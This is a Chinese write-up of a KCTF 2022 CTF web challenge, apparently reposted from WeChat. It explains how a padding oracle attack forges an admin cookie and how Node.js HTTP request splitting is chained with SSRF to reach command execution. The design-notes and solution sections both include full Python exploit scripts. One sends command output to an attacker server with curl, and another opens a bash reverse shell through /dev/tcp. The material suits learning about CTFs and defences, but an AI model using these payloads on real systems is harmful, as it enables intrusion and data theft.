---
title: 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析
url: https://buaq.net/go-137633.html
source: unSafe.sh - 不安全
date: 2022-11-29
fetch_date: 2025-10-03T23:57:14.027934
---

# 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/11e75445163fbfeee446dab5cbecd523.jpg)

看雪2022 KCTF 秋季赛 | 第五题设计思路及解析

看雪 2022 KCTF秋季赛 已于11月15日中午12点正式开始！比赛延续上一届的模式并进行优化，对每道题设置了难度值、火力值、精致度等多类积分，用规则引导题目的难度和趣味度。大家请注意：签到题（h
*2022-11-28 18:0:58
Author: [mp.weixin.qq.com(查看原文)](/jump-137633.htm)
阅读量:17
收藏*

---

[*看雪 2022 KCTF秋季赛*](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458483668&idx=1&sn=df35db255afb9045521f889594e2acc5&chksm=b18e4b5e86f9c2484ce5f892774bd08973a0a1f7e297c1862742c85fc62cda5f1873afaba952&scene=21#wechat_redirect)已于11月15日中午12点正式开始！比赛延续上一届的模式并进行优化，对每道题设置了难度值、火力值、精致度等多类积分，用规则引导题目的难度和趣味度。大家请注意：签到题（https://ctf.pediy.com/game-season\_fight-216.htm）将持续开放，整个比赛期间均可提交答案，获得积分哦～

今日中午12点，第五题《灾荒蔓延》已截止答题。本题围观人数共1k+，攻破战队数：2，分别是【98k】和【摸鱼划水打酱油】

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8ErDZhhVA7zXnLAkicmAgB9DfGurTHc3LJ8xH3ZyXzAmFDTyY4je1WOia2JDcdUcLI5tRJckNJLloZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8ErDZhhVA7zXnLAkicmAgB9D28TeqPH3GIwm0CBw4E0wCibHqE5IeasFmMPtO96IREKlnhGDiaSGia6Ig/640?wx_fmt=png)

下面一起看看该赛题的设计思路和相关解析吧~

出题团队简介

第五题《灾荒蔓延》出题方 **星盟一分队玄机** **战队****，****战队成员id：Achillesweb**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8ErDZhhVA7zXnLAkicmAgB9DgBgezF4DWiceHVA3vtdZl5YricMbJhfoDhtgqL1ECibTicovQiascmaWOkw/640?wx_fmt=png)

赛题设计思路

作者（Achilles）来自星盟安全团队。

这是一个node项目，题目需要比赛者ssrf进而命令执行获得藏在比赛题目源代码中的flag。黑盒，不给源代码附件。

```
先访问/admin，发现它是解密cookie判断是不是管理员，用padding oracle attack伪造管理员cookie
http.get函数在node的8版本（其中的较低版本）或者更低版本存在被http拆分攻击危险。攻击者通过这个漏洞可以达到http走私的效果。
通过走私满足/C00mmmmanD对ip的要求，从而命令执行
下面是一把梭脚本，注意把这个脚本放在这个项目https://github.com/pspaul/padding-oracle文件夹里面。这个脚本执行的命令是
```bashcurl xxxx:xxx/?`cat kctf.js|grep flag|base64`
```

在vps那里nc，收到后base64解密后得到flag：

```
# -*- coding: utf-8 -*-import urllib.parsefrom http.cookies import SimpleCookieimport requestsfrom padding_oracle import PaddingOraclefrom optimized_alphabets import json_alphabet
attackIP = ""attackPort = ""vpsIP = ""vpsPort = ""
def payload_encode(raw):    payload = raw.replace('\n', '\u010d\u010a') \        .replace('+', '\u012b') \        .replace(' ', '\u0120') \        .replace('"', '\u0122') \        .replace("'", '\u0a27') \        .replace('[', '\u015b') \        .replace(']', '\u015d') \        .replace('`', '\u0127') \        .replace('"', '\u0122') \        .replace("'", '\u0a27') \        .replace('[', '\u015b') \        .replace(']', '\u015d')    return payload
def oracle(cipher_hex):    headers = {'Cookie':"isadmin={}".format(cipher_hex)}    r = requests.get("http://"+attackIP+":"+attackPort+"/admin",headers = headers)    response = r.content    if b"Decrypt error" not in response:        return True    else:        return False
def step1():    r = requests.get(url="http://"+attackIP+":"+attackPort)    cookie = SimpleCookie(r.headers['Set-Cookie'])    cookie = cookie["isadmin"].value    return cookie
def step2(cipher):    o = PaddingOracle(oracle, max_retries=-1)    plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())    plain_new = b"{\"admin\":\"1\"}"    cipher_new = o.craft(cipher, plain, plain_new)    return cipher_new
def step3(new_cookie):    payload = " HTTP/1.1\n\nPOST /C00mmmmanD HTTP/1.1\nHost: 127.0.0.1\nCookie: isadmin={}\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 75\n\ncmd=curl%20"+vpsIP+"%3A"+vpsPort+"%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60\n\nGET / HTTP/1.1\ntest:"    payload = payload.format(new_cookie)    payload = payload_encode(payload)    r = requests.get("http://"+attackIP+":"+attackPort+"/search?url=http://127.0.0.1:"+attackPort+"/" + urllib.parse.quote(payload))

if __name__ == "__main__":    cookie = step1()    new_cookie = step2(cookie)    step3(new_cookie)
```

赛题解析

本赛题解析由看雪论坛会员**rmb122**给出：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8ErDZhhVA7zXnLAkicmAgB9DGHsohIH9kf7bYvibdyRXSIe6CvJMZ9Ph45J7T2VkC7HBcEBmhicfcFSw/640?wx_fmt=png)

访问主页会给一个 isadmin 的 cookie, 带上此 cookie 直接访问 /admin, 发现提示不是 admin。

对 cookie 最后一位修改后提示 decrypt error, 再结合 unhexlify 后长度 32, 可以猜出是分块加密。

然后修改第一位, 提示 json parse error, 那么可以得知大概率是 CBC 模式 + PKCS7 Padding。

```
import binascii import requests # https://github.com/mwielgoszewski/python-paddingoraclefrom paddingoracle import PaddingOracle, BadPaddingException  class PadBuster(PaddingOracle):    def __init__(self, session: requests.Session, wait: float = 0.1, **kwargs):        super(PadBuster, self).__init__(**kwargs)        self.session = session        self.wait = wait     def oracle(self, data, **kwargs):        token = binascii.hexlify(data).decode()         resp = None        while True:            try:                resp = self.session.get('http://150.158.18.137:5329/admin', cookies={                    'isadmin': token                })                break            except requests.HTTPError:                # time.sleep(self.wait)                continue         self.history.append(resp)         if 'Decrypt error' not in resp.text:            return        else:            raise BadPaddingException  sess = requests.session()pad_buster = PadBuster(sess) ct = binascii.unhexlify('b60bdcada90e7c628b68d0ed965363858dc1695757156638e9b86ac59c99e7c2')print(len(ct))print(ct) # admin_token = pad_buster.decrypt(ct[16:], block_size=16, iv=ct[:16])# print(admin_token)# b'{"admin":"0"}\x03\x03\x03' iv = bytearray(ct[:16])iv[10] = iv[10] ^ ord('0') ^ ord('1') print(binascii.hexlify(bytes(iv) + ct[16:]))
```

通过 padding oracle 可以解出是 {"admin":"0"}\x03\x03\x03, 那么直接构造 iv 使得 CBC 解密出来 admin 为 1 即可。

使用构造的 cookie 访问 /admin, 提示 post cmd 到 /C00mmmmanD. 但是此时即使带上 isadmin cookie 访问 /C00mmmmanD 却还提示不是 admin, 那么大概率要结合一开始的 /search 的接口来 SSRF。

但是 search 只能发送 GET 请求, 由 Http banner 可以得知服务器是 express, 搜索 node 的 CRLF, 可以搜到 https://xz.aliyun.com/t/2894
直接用同样的方法测试可以利用, 那么直接构造请求 POST /C00mmmmanD 即可。

```
import requests sess = requests.session() CRLF = 'č̊'BLANK = '̠' r = f'''1 HTTP/1.1Cookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Connection: keep-aliveHost: 127.0.0.1 POST /C00mmmmanD HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.86.0Accept: */*Connection: closeCookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Content-Type: application/x-www-form-urlencodedContent-Length: 72 cmd=bash -c "bash -i >%2526 /dev/tcp/ip/port 0>%25261" '''.replace('\n', CRLF).replace(' ', BLANK) # 记得修改 Content-Lengthprint(r)r = sess.get('http://150.158.18.137:5329/search?url=http://127.0.0.1:5329/C00mmmmanD?a=' + r) print(r.text)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8ErDZhhVA7zXnLAkicmAgB9DyTjwKkHVdACYzy0MsF1MEZG4Xhbou3X2xZoaARbvEpDLNqwTiaINiacw/640?wx_fmt=jpeg)

第六题《病疫先兆》比赛正在进行

https://ctf.pediy.com/game-season\_fight-221.htm

欢迎参与和围观![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaajvl7fD4ZCicMcjhXMp1v6UQQ68afWhJytuHspOcDRtNqnosZfRiaqD9E6ZQs5jaeMyw9vTrDd3DTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaa8r7PJoyAtlfHAKe8RosE3wYVKBac55p1HPBJHZS42ywnG4yYtD3jo9A9e5kawBZs4IE6R1C4wibw/640?wx_fmt=gif)

- End -

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif)

**球在看**

![](https://mmbiz.qpic.cn/mmbiz_gif/1UG7KPNHN8FxuBNT7e2...